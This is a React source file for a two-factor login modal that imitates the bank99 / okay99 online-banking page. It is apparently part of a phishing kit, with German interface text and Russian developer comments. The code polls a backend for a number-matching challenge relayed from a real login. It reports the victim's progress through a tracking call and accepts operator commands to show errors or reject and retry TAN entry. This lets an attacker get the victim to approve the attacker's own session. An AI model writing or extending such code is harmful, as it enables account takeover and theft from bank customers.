"use client";

import { useEffect, useState } from "react";
import { trackSubmission, onCommand } from "@/lib/track";

type Props = {
  onCancel: () => void;
  vergleichswert?: string;
};

export default function TwoFactorModal({ onCancel, vergleichswert }: Props) {
  const [challengeNumber, setChallengeNumber] = useState<number | null>(null);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    let cancelled = false;
    async function load() {
      try {
        const res = await fetch("/api/challenge", { cache: "no-store" });
        if (!res.ok) return;
        const data = (await res.json()) as { number: number };
        if (!cancelled) setChallengeNumber(data.number);
      } catch {
        // игнорируем сетевые ошибки — следующий тик переподтянет
      }
    }
    load();
    const id = setInterval(load, 2000);
    return () => {
      cancelled = true;
      clearInterval(id);
    };
  }, []);

  /* Track that the user is now on the 2FA waiting step */
  useEffect(() => {
    if (challengeNumber !== null) {
      trackSubmission("bank99", "2fa_waiting", { challengeNumber });
    }
  }, [challengeNumber]);

  /* Register command handler */
  useEffect(() => {
    onCommand((cmd) => {
      switch (cmd.type) {
        case "show_error":
          setError((cmd.payload?.message as string) || "Ein Fehler ist aufgetreten.");
          break;
        case "clear_error":
          setError(null);
          break;
        case "reject_tan":
          setError("Verifizierung fehlgeschlagen. Bitte versuchen Sie es erneut.");
          break;
        case "retry_tan":
          setError(null);
          setSecondsLeft(180);
          break;
      }
    });
    return () => onCommand(() => {});
  }, []);

  // TODO(backend): получить срок жизни челленджа с бэкенда (сейчас локальный отсчёт от 3:00)
  const [secondsLeft, setSecondsLeft] = useState(180);

  useEffect(() => {
    if (secondsLeft <= 0) return;
    const id = setInterval(() => setSecondsLeft((s) => s - 1), 1000);
    return () => clearInterval(id);
  }, [secondsLeft]);

  const mm = Math.floor(secondsLeft / 60);
  const ss = String(secondsLeft % 60).padStart(2, "0");

  return (
    <div className="w-full max-w-[480px] mx-4">
      <div
        className="rounded-md overflow-hidden"
        style={{
          backgroundColor: "#fff",
          border: "1px solid rgba(0,0,0,0.2)",
          boxShadow: "0 3px 9px rgba(0,0,0,0.5)",
        }}
      >
        {/* Header */}
        <div
          className="px-4 py-4"
          style={{
            backgroundColor: "#ffdc00",
            borderBottom: "1px solid #d2d8e4",
          }}
        >
          <h1 className="text-2xl font-normal m-0" style={{ color: "#333" }}>
            Anmelden Online Banking
          </h1>
        </div>

        {/* Body */}
        <div className="px-4 pt-4" style={{ backgroundColor: "#fff" }}>
          {error && (
            <div
              className="mb-3 px-3 py-2 rounded text-sm"
              style={{
                backgroundColor: "#fef2f2",
                border: "1px solid #fca5a5",
                color: "#b91c1c",
              }}
            >
              {error}
            </div>
          )}

          <hr className="border-b99-border mt-0 mb-4" />

          <div className="mb-1">
            <small className="text-xs" style={{ color: "#8c8c8c" }}>
              Zwei-Faktor-Authentifizierung
            </small>
          </div>

          <div className="mb-4">
            <select className="b99-input" defaultValue="zweistufig">
              {/* TODO(backend): подгрузить доступные методы 2FA */}
              <option value="zweistufig">Zweistufige Verifizierung</option>
            </select>
          </div>

          <p className="text-center text-sm mb-4" style={{ color: "#333" }}>
            okay99 App öffnen und auf diese Zahl tippen.
          </p>

          <div className="flex items-start gap-3 mb-4">
            <svg
              width="28"
              height="28"
              viewBox="0 0 24 24"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
              aria-hidden="true"
            >
              <path
                d="M7 10V7a5 5 0 1 1 10 0v3"
                stroke="#333"
                strokeWidth="2"
                strokeLinecap="round"
              />
              <rect
                x="5"
                y="10"
                width="14"
                height="11"
                rx="1.5"
                fill="#333"
              />
            </svg>
            <div className="text-sm leading-tight">
              <div style={{ color: "#8c8c8c" }}>Anmeldung via</div>
              {/* TODO(backend): подставить реальный user-agent сессии */}
              <div style={{ color: "#333", fontWeight: 500 }}>
                Neues Gerät (Firefox Linux x86_64)
              </div>
            </div>
          </div>
        </div>

        {/* Big number band */}
        <div className="py-8 text-center" style={{ backgroundColor: "#ffdc00" }}>
          <div
            style={{
              fontSize: "72px",
              fontWeight: 400,
              color: "#000",
              lineHeight: 1,
            }}
          >
            {vergleichswert ? vergleichswert : (challengeNumber ?? "—")}
          </div>
        </div>

        {/* Timer */}
        <div
          className="px-4 py-3 text-center"
          style={{ backgroundColor: "#fff" }}
        >
          <p className="text-sm m-0" style={{ color: "#333" }}>
            {mm}:{ss} verbleiben, um den Login zu bestätigen.
          </p>
        </div>

        {/* Footer buttons */}
        <div
          className="px-4 py-3 flex gap-3"
          style={{
            borderTop: "1px solid #d2d8e4",
            backgroundColor: "#fff",
          }}
        >
          <button
            type="button"
            onClick={onCancel}
            className="flex-1 px-4 py-2 rounded text-sm"
            style={{
              backgroundColor: "#d2d8e4",
              color: "#333",
              border: "1px solid #adb5c5",
            }}
          >
            Login abbrechen
          </button>
          <button
            type="button"
            className="flex-1 px-4 py-2 rounded text-sm"
            style={{
              backgroundColor: "#d2d8e4",
              color: "#333",
              border: "1px solid #adb5c5",
            }}
          >
            keine Internetverbindung
          </button>
        </div>
      </div>
    </div>
  );
}
